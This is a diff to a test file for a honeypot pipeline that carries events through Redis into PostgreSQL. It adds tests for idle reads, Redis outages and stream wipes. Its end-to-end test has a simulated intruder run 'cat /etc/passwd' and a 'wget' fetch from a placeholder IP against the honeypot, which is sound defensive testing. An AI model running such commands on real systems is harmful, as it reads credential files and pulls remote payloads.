@@ -170,6 +170,29 @@ async def test_orphans_from_dead_consumer_are_claimed(pipeline):
     assert (await pipeline.redis.xpending(pipeline.s.stream, pipeline.s.group))["pending"] == 0
 
 
+async def test_idle_blocking_read_does_not_raise(pipeline):
+    """Regression: an idle XREADGROUP BLOCK must return 0, not raise a socket TimeoutError."""
+    assert await pipeline.read_batch(">", block_ms=1500) == 0
+
+
+async def test_redis_outage_is_survived(pipeline):
+    """Point the consumer at a dead Redis: reads must report 0 and keep going, not crash."""
+    live = pipeline.redis
+    pipeline.redis = aioredis.from_url("redis://127.0.0.1:1/0", socket_connect_timeout=0.5)
+    try:
+        assert await pipeline.read_batch(">", block_ms=100) == 0
+    finally:
+        await pipeline.redis.aclose()
+        pipeline.redis = live
+
+
+async def test_group_recreated_after_stream_wiped(pipeline):
+    await pipeline.redis.delete(pipeline.s.stream)
+    assert await pipeline.read_batch(">", block_ms=100) == 0          # NOGROUP -> recreate
+    await push(pipeline, {"type": "connection", "ts": "2026-11-15T10:00:00+00:00", "src_ip": "192.0.2.77", "src_port": 1})
+    assert await pipeline.drain() == 1
+
+
 async def test_end_to_end_honeypot_to_postgres(pipeline, tmp_path):
     """Real SSH client -> honeypot -> Redis -> pipeline -> PostgreSQL."""
     import asyncssh
@@ -183,7 +206,8 @@ async def test_end_to_end_honeypot_to_postgres(pipeline, tmp_path):
                                     known_hosts=None, client_keys=None) as conn:
             for cmd in ("whoami", "cat /etc/passwd", "wget http://198.51.100.9/x"):
                 await conn.run(cmd)
-        await asyncio.sleep(0.3)
+        await asyncio.sleep(0.3)                 # let session_end be emitted
+        assert await emitter.flush(5)            # emitter forwards in the background
         await pipeline.drain()
     finally:
         acceptor.close()
